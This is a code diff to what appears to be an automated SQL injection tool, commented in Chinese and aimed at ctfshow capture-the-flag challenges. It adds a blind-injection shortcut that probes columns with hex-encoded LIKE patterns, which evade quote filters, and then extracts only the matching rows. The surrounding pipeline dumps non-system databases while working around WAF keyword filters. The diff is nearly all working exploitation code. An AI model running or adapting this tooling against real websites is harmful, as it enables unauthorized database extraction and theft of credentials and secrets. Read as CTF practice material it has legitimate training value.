@@ -12,10 +12,14 @@ from dataclasses import dataclass, field
 from .builder import PayloadBuilder
 from .dbms import Dialect, MYSQL, SQLITE, get_dialect, parse_create_table_columns
 from .models import WafReport
-from .oracles import BaseOracle, OracleError
+from .oracles import BaseOracle, BoolOracle, OracleError, TimeOracle
 from .session import HttpSession
 
 INTERESTING = re.compile(r"flag|user|admin|secret|key|pass|token|config", re.I)
+
+# 盲注通道 flag 优先探测：like 'ctfshow{%' / 'flag{%' 的十六进制字面量
+# （引号可能被滤，hex 字面量最稳）
+_FLAG_LIKE_HEX = ["0x63746673686f777b25", "0x666c61677b25"]
 
 # 系统库不参与业务脱库
 SYSTEM_DBS = {"information_schema", "mysql", "performance_schema", "sys", "test"}
@@ -223,6 +227,55 @@ class ExtractionPipeline:
         return cols
 
     # ------------------------------------------------------------------ data
+    def _is_blind(self) -> bool:
+        return isinstance(self.o, (BoolOracle, TimeOracle))
+
+    def try_flag_first(self, db: str, table: str, columns: list) -> list | None:
+        """盲注通道专用捷径：先探「含 flag 的行」，命中则只按行提取，
+        避免全表 group_concat 盲拖（web175 类：608 字符 ≈ 4200 请求 → ~50）。
+        未命中/构造不可行返回 None，调用方回退常规导出。"""
+        if self.waf.is_filtered("like"):
+            return None
+        comma_ok = not self.waf.is_filtered(",")
+        hit_col, n_rows = None, 0
+        for col in columns:
+            if self.s.stopped:
+                return None
+            for like_hex in _FLAG_LIKE_HEX:
+                try:
+                    cnt = self.o.scalar_int(
+                        f"(select count(*) from {db}.{table} "
+                        f"where {col} like {like_hex})")
+                except OracleError:
+                    continue
+                if cnt > 0:
+                    hit_col, n_rows = col, min(cnt, 3 if comma_ok else 1)
+                    break
+            if hit_col:
+                break
+        if not hit_col:
+            return None
+        self._note(f"flag 优先提取 {db}.{table}",
+                   f"盲注通道命中 like 命中列 {hit_col}（{n_rows} 行），"
+                   "跳过全表盲拖")
+        rows = []
+        for i in range(n_rows):
+            lim = f" limit {i},1" if comma_ok and i else " limit 1"
+            row = {}
+            for c in columns:
+                if self.s.stopped:
+                    break
+                try:
+                    row[c] = self.o.scalar(
+                        f"(select {c} from {db}.{table} where {hit_col} "
+                        f"like {_FLAG_LIKE_HEX[0]}{lim})")
+                except OracleError:
+                    row[c] = ""
+            rows.append(row)
+            self.log("DATA", f"[{db}.{table}] "
+                             f"{ {k[:16]: v[:60] for k, v in row.items()} }")
+        return rows
+
     def dump_rows(self, db: str, table: str, columns: list,
                   max_rows: int = 20) -> list:
         if self.waf.is_filtered(","):
@@ -333,6 +386,12 @@ class ExtractionPipeline:
             self.log("INFO", f"[脱库] 导出 {db}.{t} 前 {n_rows} 行（列名示例: "
                              f"{(cols[0][:20] + '…') if len(cols[0]) > 20 else cols[0]}）")
             try:
+                # 盲注通道：先试 flag 优先捷径（全表 group_concat 盲拖代价太高）
+                if self._is_blind():
+                    rows = self.try_flag_first(db, t, cols)
+                    if rows is not None:
+                        res.rows[(db, t)] = rows
+                        continue
                 res.rows[(db, t)] = self.dump_rows(db, t, cols, n_rows)
             except OracleError as e:
                 # 单表失败（超长 payload 被拦/敏感词）不阻断其余表
